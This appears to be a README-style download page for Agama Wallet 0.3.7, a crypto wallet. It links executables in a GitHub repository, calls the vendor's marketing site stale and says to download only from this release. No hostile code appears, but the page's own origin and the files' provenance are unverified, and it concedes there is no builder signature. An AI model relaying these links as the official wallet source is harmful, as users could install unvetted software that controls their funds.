[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Agama Wallet Download: Version 0.3.7 and How to Get It

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Agama Wallet 0.3.7 is distributed from a public GitHub release, with separate Windows, macOS and Linux files that each carry a published hash value. That release is the current version; the older 0.1.4 beta still shown on the marketing site is out of date. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps.

## You'll see this if

You searched for the download, found a page offering 0.1.4 beta and a repository offering 0.3.7, and cannot tell which one you are supposed to install.

| Where it is | What it offers | Status |
|---|---|---|
| GitHub release `v-0.3.7` | Windows, macOS and Linux files, each with a published hash value | Current |
| The marketing site | A 0.1.4 beta download page | Stale |
| App stores | Nothing | No mobile build in the release |

## Why it happens

Two distribution channels are out of step. The repository is where builds are published, dated and given a value you can check a file against. The marketing site was written earlier, still offers 0.1.4, and has not been updated to match, so a reader arriving from search sees a version that no longer reflects the software.

The release itself is plain: published 2026-11-15, three files, no release notes. That last part matters more than it sounds  -  a version number with no notes tells you a build exists, not what changed in it.

What the release does give you is verification. Each file carries a hash value printed on the release page, so a downloaded file can be checked against a number the publisher produced rather than trusted on sight. That is the single biggest change from the older download page, which displayed no value at all.

## Fix

Install from the release, and check the file before running it.

1. **Open the repository**, then its releases, and take `v-0.3.7`. Not a mirror, not a re-upload, not a file linked from a message.
2. **Choose the asset for your platform.** The Windows build is an `.exe`, the macOS build a `.dmg`, the Linux build a `.zip`. Sizes are 32.9 MB, 26.8 MB and 39.0 MB respectively; a file far off that size did not come from the release.
3. **Compare the hash value** of what you downloaded with the one printed beside the asset on the release page. A mismatch means the file is not the published one, and the only correct response is to delete it and download again.
4. **Install to a user account you control**, not a shared machine; the wallet's data and password belong to one user.
5. **Create a new wallet rather than importing an old one** if this is a fresh start, and record the phrase offline.
6. **Confirm the version after launch.** A build that does not report 0.3.7 is not the build the release describes.

If you are reinstalling to recover an old wallet, install first and restore afterwards; [restoring an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md) covers the order.

## If that did not work

If the installer refuses to run, check the platform and the OS version before suspecting the file. Unsigned or unnotarised builds are often blocked by default, and that is a system policy rather than corruption.

If macOS will not open the app after installation, quarantine on an unnotarised application is the usual cause. Working around it weakens the protection you were relying on, so make that choice deliberately.

If the hash value does not match, stop. Do not run the file and do not "try it anyway"  -  a substituted download is exactly what the comparison exists to catch.

If you cannot find a mobile build, that is not a search failure: the release contains desktop files only. [Agama Wallet on Android and iOS](https://github.com/agama-wallet/agama-wallet/blob/main/android-and-ios.md) sets out what is and is not available.

## Prevention

- **Download from the release, not from search results.** The stale page ranks; the release is where files are published.
- **Check the value every time**, including on a version you have installed before.
- **Keep the installer** until the next version works, so you can go back.
- **Do not install from mirrors or re-uploads.** There is nothing to compare them against.
- **Read what changed, if anything is published.** [Updating Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/how-updates-work.md) covers what to do when no notes exist.

## FAQ

### Which version is current?

0.3.7, published 2026-11-15 from the project's repository. The 0.1.4 beta on the marketing site is older and no longer the version to install.

### Are the downloads verified?

Yes, to a point: each of the three files carries a hash value on the release page, so a download can be checked against it. What is not published is a signed statement of who built it, so the value proves the file matches the release rather than who produced the release.

### Is there a release notes page?

No. The release exists and carries no description, so the version number is the only thing you can compare between builds.

### Can I download it for Android or iOS?

No. The release ships three desktop files and nothing for a phone, so any mobile file offered elsewhere is not part of this release.

### Do I need an account to download or install?

No. There is no sign-up, no licence key and no identity check at any point in the install.

### What about the 0.1.4 beta on the site?

It is an earlier download that the site still serves. Installing it means running a version the project has moved past, without the published value that makes the current release checkable.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md)
- [Updating Agama Wallet: What to Expect](https://github.com/agama-wallet/agama-wallet/blob/main/how-updates-work.md)
- [Agama Wallet on Android and iOS](https://github.com/agama-wallet/agama-wallet/blob/main/android-and-ios.md)
- [Agama Wallet: What It Is, and Which Agama You Are Looking At](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md)
